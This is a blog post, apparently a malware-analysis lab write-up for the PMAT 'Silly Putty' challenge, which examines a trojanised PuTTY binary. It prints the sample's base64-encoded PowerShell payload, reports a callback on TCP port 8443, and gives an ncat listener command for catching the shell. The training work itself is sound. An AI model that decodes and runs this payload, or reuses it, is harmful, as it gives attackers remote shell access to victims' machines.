---
layout: post
title: Silly Putty
---

## References
-PMAT LABS
-Silly Putty Challenge 1

## Challenge Questions:

### Basic Static Analysis
---

- What is the SHA256 hash of the sample?

0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee8

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

- What architecture is this binary?

![image](https://user-images.githubusercontent.com/122228333/222881522-d0bf8625-9015-40f9-8288-173f38793097.png)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

- Are there any results from submitting the SHA256 hash to VirusTotal?

Yes. Some of the results are that the file is part of PMAT Labs due to the amount of users submitting hash.

![image](https://user-images.githubusercontent.com/122228333/222881706-56b6b330-b60f-48fd-a492-df74f93fae5b.png)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

- Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?

From Floss found Powershell Script.

![image](https://user-images.githubusercontent.com/122228333/222881905-f5d42b85-4f00-4341-ba01-d11ec61402d1.png)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

- Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?

Nothing really that intresting looks like regular putty.exe

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

- Is it likely that this binary is packed?

Not packet Size of Raw Data, Virtual Size Roughly Same

![image](https://user-images.githubusercontent.com/122228333/222882106-71e8c8a4-582d-49dc-88d2-2fdde518aeb1.png)

---

### Basic Dynamic Analysis
 - Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?
 
 Powershell prompt comes up than exists. Putty initalizes.
 
 Some Traffic on Wireshark telling you connection was being made.
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------

 - From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?
 
Main Payload being iniciated is a powershell prompt

![image](https://user-images.githubusercontent.com/122228333/222912260-c25041dd-371e-4184-92b6-99da1cbb9cf7.png)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------

 - Based on Information the string is encoded with base64
 
 Yes the string is encoded with base 64.
 
H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA==
 
 
 - What is the DNS record that is queried at detonation?
 
![image](https://user-images.githubusercontent.com/122228333/222913336-d4c33491-3881-4da0-8154-033d732e4634.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

 - What is the callback port number at detonation?
 
 8443. This was determined by TCPView.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 - What is the callback protocol at detonation?
 
 The Callback Protoocl is TCP.
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 - How can you use host-based telemetry to identify the DNS record, port, and protocol?
 

![image](https://user-images.githubusercontent.com/122228333/222914137-2310dc58-e905-47ac-bb5b-ef96f3359011.png)

Run ncat -nvlp 8443

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

 
 - Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
 

![image](https://user-images.githubusercontent.com/122228333/222914303-7e05f922-9c3f-4e29-ba08-3251d014ed23.png)


![image](https://user-images.githubusercontent.com/122228333/222914340-a3bdf9f3-acc2-428f-a483-882ccfb51c67.png)






